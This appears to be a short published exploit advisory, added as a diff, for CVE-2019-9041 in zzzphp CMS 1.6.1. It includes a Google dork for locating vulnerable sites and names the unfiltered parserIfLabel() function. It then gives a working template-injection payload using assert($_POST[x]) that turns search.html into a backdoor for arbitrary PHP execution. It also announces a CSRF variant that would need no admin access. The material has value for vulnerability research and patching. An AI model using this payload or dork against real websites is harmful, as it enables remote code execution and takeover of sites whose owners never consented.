@@ -1,0 +1,30 @@
+# Exploit Title: dynamic code evaluation of zzzphp cms 1.6.1
+
+# Google Dork: intext:"2015-2019 zzcms.com"
+
+# Date: 24/02/2019
+
+# Exploit Author: Yang Chenglong
+
+# Vendor Homepage: http://www.zzzcms.com/index.html
+
+# Software Link: http://115.29.55.18/zzzphp.zip
+
+# Version: 1.6.1
+
+# Tested on: windows/Linux,iis/apache
+
+# CVE : CVE-2019-9041
+
+Due to the failure of filtering function parserIfLabel() in inc/zzz_template.php, attackers can insert dynamic php code into the template file and leads to dynamic code evaluation.
+
+Exploit:
+login in to the admin panel, edit the template of search.html, insert the following code:
+
+{if:assert($_POST[x])}phpinfo();{end if}
+
+Visit the http://webroot/search/ and post data “x = phpinfo();”, the page will execute the php code “phpinfo()” as follow:
+[1.png]
+
+Remarks:
+While the above exploit requires attackers to have the access to the admin panel, I will post another exploit by using csrf to acquire the control of website without access to the admin panel.
